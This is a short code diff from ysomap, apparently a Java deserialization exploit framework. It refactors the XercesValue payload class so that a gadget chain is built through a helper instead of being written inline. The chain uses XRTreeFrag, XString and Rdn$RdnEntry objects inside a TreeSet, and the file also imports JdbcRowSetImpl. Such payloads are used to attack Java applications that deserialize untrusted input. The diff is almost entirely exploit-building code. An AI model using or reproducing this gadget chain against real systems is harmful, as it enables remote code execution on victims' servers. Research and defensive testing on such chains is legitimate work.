@@ -7,7 +7,6 @@ import com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM;
 import com.sun.org.apache.xpath.internal.XPathContext;
 import com.sun.org.apache.xpath.internal.objects.DTMXRTreeFrag;
 import com.sun.org.apache.xpath.internal.objects.XRTreeFrag;
-import com.sun.org.apache.xpath.internal.objects.XString;
 import com.sun.rowset.JdbcRowSetImpl;
 import ysomap.common.annotation.Authors;
 import ysomap.common.annotation.Dependencies;
@@ -107,14 +106,7 @@ public class XercesValue extends Payload<Object> {
         XRTreeFrag xrTreeFrag = new XRTreeFrag(1, new XPathContext());
         ReflectionHelper.setFieldValue(xrTreeFrag, "m_DTMXRTreeFrag", dtmxrTreeFrag);
 
-        Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
-        ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
-        ReflectionHelper.setFieldValue(rdnEntry1, "value", new XString("test"));
-
-        Object rdnEntry2 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
-        ReflectionHelper.setFieldValue(rdnEntry2, "type", "ysomap");
-        ReflectionHelper.setFieldValue(rdnEntry2, "value", xrTreeFrag);
-        return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);
+        return PayloadHelper.makeTreeSetWithXString(xrTreeFrag);
     }
 
 }
